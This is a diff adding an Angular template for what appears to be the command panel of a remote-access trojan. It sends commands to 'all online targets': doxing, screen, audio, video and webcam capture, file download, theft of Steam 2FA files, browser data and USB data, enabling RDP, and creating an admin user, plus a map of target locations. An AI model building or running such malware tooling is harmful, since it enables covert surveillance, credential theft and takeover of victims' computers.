@@ -1,0 +1,117 @@
+<mat-card class="commandBtnsAll">
+  <h1 class="title"> Run on all online targets</h1>
+  <div class="commands">
+    <button mat-button color="accent" (click)="sendCommandToAllOnlineTargets('dox')">Dox</button>
+  </div>
+  <div class="commands">
+    <form [formGroup]="mouseFormAll">
+      <button mat-button [disabled]="!mouseFormAll.valid" color="accent"
+        (click)="sendCommandToAllOnlineTargets('mouse', concatTime(mouseFormAll))">Mouse Lock</button>
+      <mat-form-field appearance="fill" class="timeInput">
+        <mat-label>Time amount</mat-label>
+        <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
+        <mat-error *ngIf="mouseFormAll.get('timeAmount')?.invalid">Not a valid number...</mat-error>
+      </mat-form-field>
+      <mat-form-field appearance="fill" class="timeInput">
+        <mat-label>Time units</mat-label>
+        <select matNativeControl required #timeUnits formControlName="timeUnits">
+          <option value="s">Seconds</option>
+          <option value="m">Minutes</option>
+          <option value="h">Hours</option>
+        </select>
+      </mat-form-field>
+    </form>
+  </div>
+  <div class="commands">
+    <button mat-button color="accent" (click)="sendCommandToAllOnlineTargets('screen')">Screen</button>
+  </div>
+  <div class="commands">
+    <form [formGroup]="downloadFormAll">
+      <button mat-button [disabled]="!downloadFormAll.valid" color="accent"
+        (click)="sendCommandToAllOnlineTargets('download', getPath(downloadFormAll))">Download</button>
+      <mat-form-field appearance="fill" class="timeInput">
+        <mat-label>Path</mat-label>
+        <input matInput required formControlName="path" #path>
+        <mat-error *ngIf="downloadFormAll.get('path')?.invalid">Not a valid path...</mat-error>
+      </mat-form-field>
+    </form>
+  </div>
+  <div class="commands">
+    <form [formGroup]="recordFormAll">
+      <button mat-button [disabled]="!recordFormAll.valid" color="accent"
+        (click)="sendCommandToAllOnlineTargets('record', concatTime(recordFormAll))">Record</button>
+      <mat-form-field appearance="fill" class="timeInput">
+        <mat-label>Time amount</mat-label>
+        <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
+        <mat-error *ngIf="recordFormAll.get('timeAmount')?.invalid">Not a valid number...</mat-error>
+      </mat-form-field>
+      <mat-form-field appearance="fill" class="timeInput">
+        <mat-label>Time units</mat-label>
+        <select matNativeControl required #timeUnits formControlName="timeUnits">
+          <option value="s">Seconds</option>
+          <option value="m">Minutes</option>
+          <option value="h">Hours</option>
+        </select>
+      </mat-form-field>
+    </form>
+  </div>
+  <div class="commands">
+    <button mat-button color="accent" (click)="sendCommandToAllOnlineTargets('getSteam2fa')">Get Steam 2FA
+      Files</button>
+  </div>
+  <div class="commands">
+    <form [formGroup]="videoRecordFormAll">
+      <button mat-button [disabled]="!videoRecordFormAll.valid" color="accent"
+        (click)="sendCommandToAllOnlineTargets('videoRecord', concatTime(videoRecordFormAll))">Video Record</button>
+      <mat-form-field appearance="fill" class="timeInput">
+        <mat-label>Time amount</mat-label>
+        <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
+        <mat-error *ngIf="videoRecordFormAll.get('timeAmount')?.invalid">Not a valid number...</mat-error>
+      </mat-form-field>
+      <mat-form-field appearance="fill" class="timeInput">
+        <mat-label>Time units</mat-label>
+        <select matNativeControl required #timeUnits formControlName="timeUnits">
+          <option value="s">Seconds</option>
+          <option value="m">Minutes</option>
+          <option value="h">Hours</option>
+        </select>
+      </mat-form-field>
+    </form>
+  </div>
+  <div class="commands">
+    <form [formGroup]="cameraRecordFormAll">
+      <button mat-button [disabled]="!cameraRecordFormAll.valid" color="accent"
+        (click)="sendCommandToAllOnlineTargets('cameraRecord', concatTime(cameraRecordFormAll))">Camera Record</button>
+      <mat-form-field appearance="fill" class="timeInput">
+        <mat-label>Time amount</mat-label>
+        <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
+        <mat-error *ngIf="cameraRecordFormAll.get('timeAmount')?.invalid">Not a valid number...</mat-error>
+      </mat-form-field>
+      <mat-form-field appearance="fill" class="timeInput">
+        <mat-label>Time units</mat-label>
+        <select matNativeControl required #timeUnits formControlName="timeUnits">
+          <option value="s">Seconds</option>
+          <option value="m">Minutes</option>
+          <option value="h">Hours</option>
+        </select>
+      </mat-form-field>
+    </form>
+  </div>
+  <div class="commands">
+    <button mat-button color="accent"
+      (click)="sendCommandToAllOnlineTargets('getBrowserData')">Get Browser Data</button>
+  </div>
+  <div class="commands">
+    <button mat-button color="accent"
+      (click)="sendCommandToAllOnlineTargets('getUSBData')">Get USB Data</button>
+  </div>
+  <div class="commands">
+    <button mat-button color="accent"
+      (click)="sendCommandToAllOnlineTargets('rdpEnable')">Enable RDP</button>
+  </div>
+  <div class="commands">
+    <button mat-button color="accent"
+      (click)="sendCommandToAllOnlineTargets('createAdminUser')">Create Admin User</button>
+  </div>
+</mat-card>
+<app-targets-location-graph></app-targets-location-graph>
